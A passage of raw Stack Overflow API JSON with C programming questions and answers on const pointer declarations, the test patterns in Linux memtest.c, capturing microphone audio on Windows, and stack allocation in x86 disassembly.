"score": 2, "last_activity_date": 1449659008, "last_edit_date": 1449659008, "creation_date": 1449658448, "answer_id": 34176983, "question_id": 34174761, "link": "https://stackoverflow.com/questions/34174761/char-const-const-const-varname/34176983#34176983", "title": "char const *const *const varName", "body": "<p>In <code>char const *const *const strings</code>, <code>strings</code> is a pointer to a <code>char</code> pointer. Without the <code>const</code> qualifiers it would look like this:</p>\n\n<pre><code>char **strings;\n</code></pre>\n\n<p>The <code>const</code> qualifiers prohibit modifying the dereferenced value at the particular level of dereferencing:</p>\n\n<pre><code>**strings = (char) something1; // not allowed because of the first const\n*strings = (char *) something2; // not allowed because of the second const\nstrings = (char **) something3; // not allowed because of the third const\n</code></pre>\n\n<p>In other words, the third const says that the pointer itself is immutable, the second const says that the pointed-to pointer is immutable and the first says that the pointed-to character is immutable.</p>\n"}, {"comments": [{"owner": {"reputation": 1696, "user_id": 905439, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/bf708cab6026b7780e96436d124b2047?s=128&d=identicon&r=PG", "display_name": "Roman", "link": "https://stackoverflow.com/users/905439/roman"}, "edited": false, "score": 0, "creation_date": 1518368055, "post_id": 34177492, "comment_id": 84466988, "body": "Actually I wanted to unvote this answer, but I cant&#39; now, because 5 mins passed. This says &quot;after this key-word &quot; when in fact it&#39;s &quot;before&quot;. Even this example says it:"}, {"owner": {"reputation": 1696, "user_id": 905439, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/bf708cab6026b7780e96436d124b2047?s=128&d=identicon&r=PG", "display_name": "Roman", "link": "https://stackoverflow.com/users/905439/roman"}, "edited": false, "score": 0, "creation_date": 1518368061, "post_id": 34177492, "comment_id": 84466991, "body": "// Can neither change letters in words, not replace words, but re-point to other block of words const char * const* string2 = (const char * const*) &amp;data[0];"}], "tags": [], "owner": {"reputation": 6788, "user_id": 298206, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/2911c6ad709ff05272e49a21df247da2?s=128&d=identicon&r=PG", "display_name": "Valentin Heinitz", "link": "https://stackoverflow.com/users/298206/valentin-heinitz"}, "is_accepted": false, "score": 1, "last_activity_date": 1449659922, "creation_date": 1449659922, "answer_id": 34177492, "question_id": 34174761, "link": "https://stackoverflow.com/questions/34174761/char-const-const-const-varname/34177492#34177492", "title": "char const *const *const varName", "body": "<p>The key-word const makes the declaration after this key-word to a constant.\nThe code explains better than words:</p>\n\n<pre><code>/////// Test-code. Place anywhere in global space in C/C++ code, step with debugger\nchar a1[] = \"test1\";\nchar a2[] = \"test2\";\n\nchar *data[2] = {a1,a2};\n\n// Nothing const, change letters in words, replace words, re-point to other block of words\nchar **string = &amp;data[0]; \n\n// Can't change letters in words, but replace words, re-point to other block of words\nconst char **string1 = (const char **) &amp;data[0];\n// Can neither change letters in words, not replace words, but re-point to other block of words\nconst char * const* string2 = (const char * const*) &amp;data[0];\n// Can change nothing, however I don't understand the meaning of the 2nd const\nconst char const* const* const string3 = (const char const* const* const ) &amp;data[0];\n\n\nint foo()\n{\n\n    // data in debugger is:               {\"test1\",\"test2\"}\n    **string = 'T';         //data is now {\"Test1\",\"test2\"}\n    //1 **string1 = 'T';    //Compiler error: you cannot assign to a variable that is const (VS2008)\n    *string1=a2;            //data is now {\"test2\",\"test2\"}\n    //2 **string2='T';      //Compiler error: you cannot assign to a variable that is const (VS2008)\n    //3 *string2=a2;        //Compiler error: you cannot assign to a variable that is const (VS2008)\n    string2=string1;\n\n    //4 **string3='T';      //Compiler error: you cannot assign to a variable that is const (VS2008)\n    //5 *string3=a2;        //Compiler error: you cannot assign to a variable that is const (VS2008)\n    //6 string3=string1;    //Compiler error: you cannot assign to a variable that is const (VS2008)\n    return 0;\n}\n\nstatic int dummy = foo();\n\n/////// END OF Test-code\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 6788, "user_id": 298206, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/2911c6ad709ff05272e49a21df247da2?s=128&d=identicon&r=PG", "display_name": "Valentin Heinitz", "link": "https://stackoverflow.com/users/298206/valentin-heinitz"}, "edited": false, "score": 0, "creation_date": 1449664058, "post_id": 34177667, "comment_id": 56103885, "body": "const refers fo the declaration which follows const, not which precedes."}, {"owner": {"reputation": 456, "user_id": 5529678, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d52fceadf783b1021718b90c86b53403?s=128&d=identicon&r=PG&f=1", "display_name": "sendaran", "link": "https://stackoverflow.com/users/5529678/sendaran"}, "reply_to_user": {"reputation": 6788, "user_id": 298206, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/2911c6ad709ff05272e49a21df247da2?s=128&d=identicon&r=PG", "display_name": "Valentin Heinitz", "link": "https://stackoverflow.com/users/298206/valentin-heinitz"}, "edited": false, "score": 4, "creation_date": 1449672237, "post_id": 34177667, "comment_id": 56109393, "body": "@ValentinHeinitz That is incorrect. <code>const</code> refers to the type on the left. Only in the special case where there is nothing to the left of <code>const</code>, <code>const</code> will refer to the type on the right. <code>int const *p</code> is a non-const pointer to a constant integer. <code>const int *p</code> is the same. <code>const int const *p</code> has one redundant <code>const</code>. <code>int * const p</code> is a constant pointer to non-constant integer.  See <a href=\"https://en.wikipedia.org/wiki/Const_%28computer_programming%29\" rel=\"nofollow noreferrer\">C &amp; C++ conventions for const</a>. It&#39;s easy to misundestand <code>const</code> when <code>const int</code> and <code>int const</code> are both valid."}, {"owner": {"reputation": 33821, "user_id": 45685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/y4RJr.jpg?s=128&g=1", "display_name": "AndersK", "link": "https://stackoverflow.com/users/45685/andersk"}, "reply_to_user": {"reputation": 456, "user_id": 5529678, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d52fceadf783b1021718b90c86b53403?s=128&d=identicon&r=PG&f=1", "display_name": "sendaran", "link": "https://stackoverflow.com/users/5529678/sendaran"}, "edited": false, "score": 1, "creation_date": 1449680930, "post_id": 34177667, "comment_id": 56115791, "body": "@sendaran yes, for that reason I stopped using const on the left side when possible, i find it more consistent that way and works fine with typedefs"}], "tags": [], "owner": {"reputation": 33821, "user_id": 45685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/y4RJr.jpg?s=128&g=1", "display_name": "AndersK", "link": "https://stackoverflow.com/users/45685/andersk"}, "is_accepted": false, "score": 4, "last_activity_date": 1449660388, "creation_date": 1449660388, "answer_id": 34177667, "question_id": 34174761, "link": "https://stackoverflow.com/questions/34174761/char-const-const-const-varname/34177667#34177667", "title": "char const *const *const varName", "body": "<pre><code>char const *const *const strings\n ^    v    ^  v   ^  v\n |    |    |  |   |  |\n +-----    +--+   +--+\n</code></pre>\n\n<p>so basically it means all pointers and the strings that the pointers point to are constant, meaning the function cannot modify the passed strings in any way (except if it gets casted).</p>\n\n<p>e.g.</p>\n\n<pre><code>char* p{\"string1\",\"string2\"};\n</code></pre>\n\n<p>which will decay into char**</p>\n\n<p>when passed to</p>\n\n<pre><code>int n = 0; \nadvanceToNextRuleEntryRelatedIndex( n, 2, p);\n</code></pre>\n"}], "owner": {"reputation": 2594, "user_id": 815961, "user_type": "registered", "accept_rate": 51, "profile_image": "https://i.stack.imgur.com/ofYz8.jpg?s=128&g=1", "display_name": "Pavan Dittakavi", "link": "https://stackoverflow.com/users/815961/pavan-dittakavi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3677, "favorite_count": 0, "answer_count": 3, "score": 3, "last_activity_date": 1449660388, "creation_date": 1449652378, "last_edit_date": 1449655577, "question_id": 34174761, "link": "https://stackoverflow.com/questions/34174761/char-const-const-const-varname", "title": "char const *const *const varName", "body": "<p>I have a method that is having the following signature:</p>\n\n<pre><code>size_t advanceToNextRuleEntryRelatedIndex( size_t index, size_t nStrings, char const *const *const strings)\n</code></pre>\n\n<p>How do I interpret this: <code>char const *const *const strings</code>?. </p>\n\n<p>Thanks,\nPavan.</p>\n"}, {"tags": ["kernel", "c", "memory-management"], "comments": [{"owner": {"reputation": 391, "user_id": 2344631, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-WDYfQzrarRo/AAAAAAAAAAI/AAAAAAAADE8/dLfjG8491mE/photo.jpg?sz=128", "display_name": "roaima", "link": "https://stackoverflow.com/users/2344631/roaima"}, "edited": false, "score": 0, "creation_date": 1449654455, "post_id": 34179078, "comment_id": 56104357, "body": "These aren&#39;t addresses. What&#39;s your question?"}, {"owner": {"reputation": 3503, "user_id": 2365568, "user_type": "registered", "accept_rate": 49, "profile_image": "https://i.stack.imgur.com/rnqtk.jpg?s=128&g=1", "display_name": "Bj&#246;rn Hallstr&#246;m", "link": "https://stackoverflow.com/users/2365568/bj%c3%b6rn-hallstr%c3%b6m"}, "reply_to_user": {"reputation": 391, "user_id": 2344631, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-WDYfQzrarRo/AAAAAAAAAAI/AAAAAAAADE8/dLfjG8491mE/photo.jpg?sz=128", "display_name": "roaima", "link": "https://stackoverflow.com/users/2344631/roaima"}, "edited": false, "score": 0, "creation_date": 1449654754, "post_id": 34179078, "comment_id": 56104358, "body": "@roaima - hmmm missunderstanding or I have been unclear maybe ;-) ... in the context of pointers, yes its not addresses, but since memtest.c is testing ram for corrupt addresses - the array u64 (long) seem to <b>represent</b> addresses at some point of view. My question is how this array is used in the function? Probably the question should be migrated to stackoverflow with a c-tag?"}, {"owner": {"reputation": 391, "user_id": 2344631, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-WDYfQzrarRo/AAAAAAAAAAI/AAAAAAAADE8/dLfjG8491mE/photo.jpg?sz=128", "display_name": "roaima", "link": "https://stackoverflow.com/users/2344631/roaima"}, "edited": false, "score": 0, "creation_date": 1449660217, "post_id": 34179078, "comment_id": 56104359, "body": "You&#39;ve got a satisfactory Answer now, I think. But no, these are not addresses; it&#39;s a block of data that&#39;s copied into memory addresses either long word at a time or as a block (I&#39;ve not examined the source code)"}, {"owner": {"reputation": 296, "user_id": 2130789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8fc8cdb6979d776db3b0aab1e3377b5?s=128&d=identicon&r=PG", "display_name": "Murray Jensen", "link": "https://stackoverflow.com/users/2130789/murray-jensen"}, "edited": false, "score": 0, "creation_date": 1449662555, "post_id": 34179078, "comment_id": 56104360, "body": "As an aside, the <code>__initdata</code> <i>attribute</i> for the <code>patterns</code> array is interesting. In the kernel, it means memory that can be freed after kernel initialisation is complete. <i>PS</i> the <code>u64</code> type is specifically an unsigned value that is 64 bits wide - not necessarily a <code>long</code>."}], "answers": [{"comments": [{"owner": {"reputation": 3503, "user_id": 2365568, "user_type": "registered", "accept_rate": 49, "profile_image": "https://i.stack.imgur.com/rnqtk.jpg?s=128&g=1", "display_name": "Bj&#246;rn Hallstr&#246;m", "link": "https://stackoverflow.com/users/2365568/bj%c3%b6rn-hallstr%c3%b6m"}, "edited": false, "score": 0, "creation_date": 1449655280, "post_id": 34179079, "comment_id": 56104361, "body": "seem to be the answer I have been looking for - it make sense that it use these integers in testing memory. Did not think of that :-)"}, {"owner": {"reputation": 48092, "user_id": 136208, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/8a30f566f1b7c9ae44cf245138850ba4?s=128&d=identicon&r=PG", "display_name": "AProgrammer", "link": "https://stackoverflow.com/users/136208/aprogrammer"}, "edited": false, "score": 2, "creation_date": 1449655915, "post_id": 34179079, "comment_id": 56104362, "body": "x86 being little endian, that means that &quot;LINUXrlz&quot; will be in the correct order in the memory."}], "tags": [], "owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "is_accepted": false, "score": 3, "last_activity_date": 1449654866, "creation_date": 1449654866, "answer_id": 34179079, "question_id": 34179078, "link": "https://stackoverflow.com/questions/34179078/memtest-c-linux/34179079#34179079", "title": "memtest.c linux", "body": "<blockquote>\n  <p>And what about the comment <code>/* yeah ;-) */</code></p>\n</blockquote>\n\n<p>The <code>0x7a6c7258554e494c</code> integer can be decoded in (Ascii) <code>zlrXINUL</code>, (\"LINUX rules\" in reverse).</p>\n\n<p>This statement declares an array of 17 64 bits unsigned integers. I think that all of these integers will be written and read in each all memory space to check that no bit is lost in the operation.</p>\n\n<p>The address of the array is chosen by the compiler in program memory, and the program will chose explicitly each address in RAM\u00a0to be tested. </p>\n\n<p>Next question : how to test the memory on which the program is stored? Will kernel move the program by playing with pagination or segmentation?</p>\n"}, {"comments": [{"owner": {"reputation": 3503, "user_id": 2365568, "user_type": "registered", "accept_rate": 49, "profile_image": "https://i.stack.imgur.com/rnqtk.jpg?s=128&g=1", "display_name": "Bj&#246;rn Hallstr&#246;m", "link": "https://stackoverflow.com/users/2365568/bj%c3%b6rn-hallstr%c3%b6m"}, "edited": false, "score": 0, "creation_date": 1449675588, "post_id": 34179080, "comment_id": 56111912, "body": "Thanks - good answer, but I dont know which answer to accept? :-)"}], "tags": [], "owner": {"reputation": 5756, "user_id": 2768341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fjQy3.jpg?s=128&g=1", "display_name": "chaos", "link": "https://stackoverflow.com/users/2768341/chaos"}, "is_accepted": false, "score": 4, "last_activity_date": 1449660247, "last_edit_date": 1492086987, "creation_date": 1449660247, "answer_id": 34179080, "question_id": 34179078, "link": "https://stackoverflow.com/questions/34179078/memtest-c-linux/34179080#34179080", "title": "memtest.c linux", "body": "<p>Those are not addresses in memory, those are test patterns. The memtest writes them to physical memory registers, reads back the data written, and compares it for errors.</p>\n\n<hr>\n\n<p>If you translate them into binary in that order they appear in the c-snippet, it looks like this:</p>\n\n<pre><code>0000000000000000000000000000000000000000000000000000000000000000\n1111111111111111111111111111111111111111111111111111111111111111\n0101010101010101010101010101010101010101010101010101010101010101\n1010101010101010101010101010101010101010101010101010101010101010\n0001000100010001000100010001000100010001000100010001000100010001\n0010001000100010001000100010001000100010001000100010001000100010\n0100010001000100010001000100010001000100010001000100010001000100\n1000100010001000100010001000100010001000100010001000100010001000\n0011001100110011001100110011001100110011001100110011001100110011\n0110011001100110011001100110011001100110011001100110011001100110\n1001100110011001100110011001100110011001100110011001100110011001\n1100110011001100110011001100110011001100110011001100110011001100\n0111011101110111011101110111011101110111011101110111011101110111\n1011101110111011101110111011101110111011101110111011101110111011\n1101110111011101110111011101110111011101110111011101110111011101\n1110111011101110111011101110111011101110111011101110111011101110\n0111101001101100011100100101100001010101010011100100100101001100\n</code></pre>\n\n<p>I replaced the 0s with spaces and then, you may see the pattern better:</p>\n\n<pre><code>1111111111111111111111111111111111111111111111111111111111111111\n 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 \n   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1\n  1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1 \n 1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1  \n1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   1   \n  11  11  11  11  11  11  11  11  11  11  11  11  11  11  11  11\n 11  11  11  11  11  11  11  11  11  11  11  11  11  11  11  11 \n1  11  11  11  11  11  11  11  11  11  11  11  11  11  11  11  1\n11  11  11  11  11  11  11  11  11  11  11  11  11  11  11  11  \n 111 111 111 111 111 111 111 111 111 111 111 111 111 111 111 111\n1 111 111 111 111 111 111 111 111 111 111 111 111 111 111 111 11\n11 111 111 111 111 111 111 111 111 111 111 111 111 111 111 111 1\n111 111 111 111 111 111 111 111 111 111 111 111 111 111 111 111 \n 1111 1  11 11   111  1  1 11    1 1 1 1 1  111  1  1  1 1  11  \n</code></pre>\n\n<p>It shifts the 1s and 0s in the memory adresses. This is a rather common technique to stress test physical memory. Each bit has to flip multiple times.</p>\n\n<p>The last pattern doesn't fit the rest. See @purplepsycho <a href=\"https://unix.stackexchange.com/a/248289/52727\">answer</a> what that means. This is the last pattern, which then stays in tested memory.</p>\n\n<hr>\n\n<p>You can copy that first part into a <code>file</code> and run this <code>awk</code> on it, for a briefly demonstration, what happens in memory (0s removed):</p>\n\n<pre><code>awk '{ORS=\"\\r\"; system(\"sleep 0.5\"); gsub(\"0\", \" \", $0);}1' file\n</code></pre>\n"}], "migrated_from": {"other_site": {"aliases": ["http://linux.stackexchange.com"], "markdown_extensions": ["Prettify"], "launch_date": 1294871917, "open_beta_date": 1282071600, "closed_beta_date": 1281466800, "site_state": "normal", "high_resolution_icon_url": "https://cdn.sstatic.net/Sites/unix/Img/apple-touch-icon@2.png", "favicon_url": "https://cdn.sstatic.net/Sites/unix/Img/favicon.ico", "icon_url": "https://cdn.sstatic.net/Sites/unix/Img/apple-touch-icon.png", "audience": "users of Linux, FreeBSD and other Un*x-like operating systems", "site_url": "https://unix.stackexchange.com", "api_site_parameter": "unix", "logo_url": "https://cdn.sstatic.net/Sites/unix/Img/logo.png", "name": "Unix &amp; Linux", "site_type": "main_site"}, "on_date": 1449664849, "question_id": 248278}, "owner": {"reputation": 3503, "user_id": 2365568, "user_type": "registered", "accept_rate": 49, "profile_image": "https://i.stack.imgur.com/rnqtk.jpg?s=128&g=1", "display_name": "Bj&#246;rn Hallstr&#246;m", "link": "https://stackoverflow.com/users/2365568/bj%c3%b6rn-hallstr%c3%b6m"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 840, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1449664971, "creation_date": 1449651676, "last_edit_date": 1449664971, "question_id": 34179078, "link": "https://stackoverflow.com/questions/34179078/memtest-c-linux", "title": "memtest.c linux", "body": "<p>I have basic knowledge of C and when studying <a href=\"http://lxr.free-electrons.com/source/mm/memtest.c\" rel=\"nofollow\"><code>memtest.c</code></a>, I can't understand the following - which the source code starts with:</p>\n\n<pre><code> static u64 patterns[] __initdata = {\n       /* The first entry has to be 0 to leave memtest with zeroed memory */\n      0,\n      0xffffffffffffffffULL,\n      0x5555555555555555ULL,\n      0xaaaaaaaaaaaaaaaaULL,\n      0x1111111111111111ULL,\n      0x2222222222222222ULL,\n      0x4444444444444444ULL,\n      0x8888888888888888ULL,\n      0x3333333333333333ULL,\n      0x6666666666666666ULL,\n      0x9999999999999999ULL,\n      0xccccccccccccccccULL,\n      0x7777777777777777ULL,\n      0xbbbbbbbbbbbbbbbbULL,\n      0xddddddddddddddddULL,\n      0xeeeeeeeeeeeeeeeeULL,\n      0x7a6c7258554e494cULL, /* yeah ;-) */\n };\n</code></pre>\n\n<p>And what about the comment <code>yeah ;-)</code> ? :-)</p>\n\n<p>I have never seen this in C - how could it be explained and how is it used?</p>\n\n<p>EDIT: now its more clear when u64 obviously is a typedef for long and ULL is a suffix for Unsigned Long Long. But the (representing) <em>memory addresses</em> of RAM in this array seems to be arbitrary choosen?</p>\n"}, {"tags": ["c", "wav", "microphone"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1449651323, "post_id": 34174407, "comment_id": 56095724, "body": "For Windows, look up the waveIn API. (It&#39;s a bit old, but it&#39;s for C and pretty simple, and as far as I know it still works perfectly well)"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449652499, "post_id": 34174407, "comment_id": 56096500, "body": "Please alse see <a href=\"http://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">Why is \u201cwhile ( !feof (file) )\u201d always wrong?</a> It is better to control the loop with the number of items returned by <code>fread()</code>."}, {"owner": {"reputation": 11, "user_id": 5554223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec86176ef028b66404a059397f021027?s=128&d=identicon&r=PG&f=1", "display_name": "Josh", "link": "https://stackoverflow.com/users/5554223/josh"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1449654375, "post_id": 34174407, "comment_id": 56097744, "body": "@immibis and Weather Vane, thank you for replying. the code I posted works right for a saved wav file in my laptop. and it is clear i can use fread() and fwrite() to access block by block. my sole problem is what built in functions in C can i use to capture the mic input."}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1449655568, "post_id": 34174407, "comment_id": 56098533, "body": "Maybe see: <a href=\"http://stackoverflow.com/questions/2010400/best-api-for-low-level-audio-in-windows\" title=\"best api for low level audio in windows\">stackoverflow.com/questions/2010400/&hellip;</a>"}, {"owner": {"reputation": 11, "user_id": 5554223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec86176ef028b66404a059397f021027?s=128&d=identicon&r=PG&f=1", "display_name": "Josh", "link": "https://stackoverflow.com/users/5554223/josh"}, "reply_to_user": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1449661196, "post_id": 34174407, "comment_id": 56102200, "body": "@Toby Thanks. I had seen the link. its good except it suggests PortAudio. Is C language unable to handle audio input with out the support of some tools/software?"}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1449662790, "post_id": 34174407, "comment_id": 56103137, "body": "@Josh I was thinking more the wavein API which is <i>essentially</i> the most basic interface that MS Windows provides to allow you to interact with the sound input to the OS. At some point your program will need to request outside code (i.e. the OS) to get data from the audio source for you. This will of course then be platform dependent. At a normal level there will always be outside code (even if it&#39;s just the OS) that your program will need to interact with to talk to H/W. The extra packages mentioned can make this interaction simpler."}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1449662950, "post_id": 34174407, "comment_id": 56103231, "body": "To satisfy the pedantic: I imagine there are all sorts of lower-level ways you could interact with audio H/W, such as directly to audio driver API&#39;s, low-level I/O or what-have you but this will always still require some level of dealing with the OS, so you&#39;d really be making things much more difficult for close to zero gain."}, {"owner": {"reputation": 11, "user_id": 5554223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec86176ef028b66404a059397f021027?s=128&d=identicon&r=PG&f=1", "display_name": "Josh", "link": "https://stackoverflow.com/users/5554223/josh"}, "reply_to_user": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1449663297, "post_id": 34174407, "comment_id": 56103447, "body": "@Toby you are welcome. You are persuading me. and am getting open to use some tools or a different language. What good option of such tools do I have? and if i change language, would it be easier in C++ or java? one more thing, does it all depend on the IDE i use?"}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1449667717, "post_id": 34174407, "comment_id": 56106154, "body": "@Josh you can still use C with the wavein API or DirectX (see: <a href=\"http://stackoverflow.com/questions/4696079/directx-programming-in-c\" title=\"directx programming in c\">stackoverflow.com/questions/4696079/directx-programming-in-c</a>&zwnj;&#8203;). although some say C++ maybe easier to use with the APIs mentioned. The IDE shouldn&#39;t really matter, Dev-C++ should handle stuff fine, you just need to make sure you link to the API correctly (using the correct includes, etc) to be able to program using it."}, {"owner": {"reputation": 11, "user_id": 5554223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec86176ef028b66404a059397f021027?s=128&d=identicon&r=PG&f=1", "display_name": "Josh", "link": "https://stackoverflow.com/users/5554223/josh"}, "reply_to_user": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1449669447, "post_id": 34174407, "comment_id": 56107274, "body": "@Toby Thank you! I will go through"}], "owner": {"reputation": 11, "user_id": 5554223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec86176ef028b66404a059397f021027?s=128&d=identicon&r=PG&f=1", "display_name": "Josh", "link": "https://stackoverflow.com/users/5554223/josh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 607, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1449651130, "creation_date": 1449651130, "question_id": 34174407, "link": "https://stackoverflow.com/questions/34174407/how-can-i-capture-wavaudio-input-from-a-mic-in-c", "title": "how can i capture WAVaudio input from a mic in C?", "body": "<p>How can I capture an audio input of a WAV file through microphone in c for windows 8 ? I have searched for,but i couldn't find one the way i looked for. I do not want to use any additional software tool and I want it in <strong>C programming</strong> language. My friends advised to me to use a different language like java or change the IDE. i want to be sure first that it is not done in C, using Dev-C++ and with out any additional tool. Now am wondering if this is available at all because i couldn't find such C-functions to capture audio from live input. am using Dev-C++ IDE. I can read and process if it is from stored file in HDD. I appreciate any hint</p>\n\n<p>for files already stored in a disc, i have the following snippet:</p>\n\n<pre><code> if ((wptr1 = fopen(wavContent1, \"rb\")) == NULL)\n {\n printf(\"Cannot open the input file\\n\");\n ret = FAIL;\n }\n else if ( (wptr2 = fopen((wavContentout), \"wb\")) == NULL )\n {\n printf(\"Cannot open the output file\\n\");\n ret = FAIL;\n }\n else {\n   hdInfo=malloc(sizeof(header)) ;      \n   writeReadable(wptr1,wptr2);\n   fclose(wptr2);\n   fclose(wptr1);\n\n  }\n</code></pre>\n\n<p>and for the function writeReadable() i have the following shortened code:</p>\n\n<pre><code>  void writeReadable(FILE *wavin, FILE *wavout){\n  int BUFSIZE=128;      \n  int buff[BUFSIZE];\n  int* buf=buff;\n\n    fread(hdInfo, sizeof(header), 1, wavin);\n    fwrite(hdInfo, sizeof(*hdInfo), 1, wavout);\n\n   while (!feof(wavin))\n   {\n    fread(buff, BUFSIZE, 1, wavin);\n    fwrite(buff, BUFSIZE, 1, wavout);\n    size= size + BUFSIZE;\n    count++;           \n    } \n   size=size + sizeof(*hdInfo);\n  }\n</code></pre>\n"}, {"tags": ["c", "assembly", "x86", "reverse-engineering", "32-bit"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 2, "creation_date": 1449651964, "post_id": 34174391, "comment_id": 56096148, "body": "The allocation happens just a bit before, in <code>mov esp, 0x98</code>. Besides allocating <code>0x80</code> for the <code>buffer</code>, it also allocates <code>0x18</code> for other variables in that scope. The <code>lea</code> instruction is just to determine the <i>address</i> of <code>buffer</code> on the stack."}, {"owner": {"reputation": 21, "user_id": 5176671, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/25b99babbca58ceb0871c3b0a65d676a?s=128&d=identicon&r=PG&f=1", "display_name": "stackosiete", "link": "https://stackoverflow.com/users/5176671/stackosiete"}, "edited": false, "score": 0, "creation_date": 1449653157, "post_id": 34174391, "comment_id": 56096934, "body": "Thak you comment! i see."}, {"owner": {"reputation": 21, "user_id": 5176671, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/25b99babbca58ceb0871c3b0a65d676a?s=128&d=identicon&r=PG&f=1", "display_name": "stackosiete", "link": "https://stackoverflow.com/users/5176671/stackosiete"}, "edited": false, "score": 0, "creation_date": 1449653544, "post_id": 34174391, "comment_id": 56097180, "body": "Thak you comment! i see. but, I still don&#39;t understand.sorry. why allocating 0x80 for the buffer? why do you find 0x80. Thank you!"}, {"owner": {"reputation": 39526, "user_id": 265804, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/156ef8708acdbf6a9ef76dad0d69609f?s=128&d=identicon&r=PG&f=1", "display_name": "Blagovest Buyukliev", "link": "https://stackoverflow.com/users/265804/blagovest-buyukliev"}, "edited": false, "score": 0, "creation_date": 